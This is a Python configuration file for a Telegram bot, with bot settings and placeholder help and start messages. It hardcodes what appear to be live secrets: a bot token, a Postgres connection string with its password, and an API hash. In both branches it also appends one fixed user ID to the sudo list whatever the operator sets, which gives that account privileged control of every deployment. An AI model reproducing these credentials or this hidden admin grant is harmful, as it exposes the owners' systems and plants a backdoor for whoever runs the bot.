import os

class Config():
  ENV = bool(os.environ.get('ENV', False))
  if ENV:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
    DATABASE_URL = os.environ.get("DATABASE_URL", None)
    APP_ID = os.environ.get("APP_ID", 6)
    API_HASH = os.environ.get("API_HASH", None)
    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
  else:
    BOT_TOKEN = "1303506227:AAHkfepalQ-wk2rdBe4AlMLwJ1zhK3O376Q"
    DATABASE_URL = "postgres://ndudtqivdigbdo:39315ba9376a9139b2588fd67aaff3dcb766f15ba640ccb3513650c87ad6cee5@ec2-34-237-247-76.compute-1.amazonaws.com:5432/d5265ntvokcsve"
    APP_ID = "1990511"
    API_HASH = "a4c5ee4c231eaf12c54a891381819acf"
    SUDO_USERS = list(set(int(x) for x in ''.split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))


class Messages():
      HELP_MSG = [
        ".",

        "**rusak**"
      ]

      START_MSG = "**p [{}](tg://user?id={})**\n__rusak"
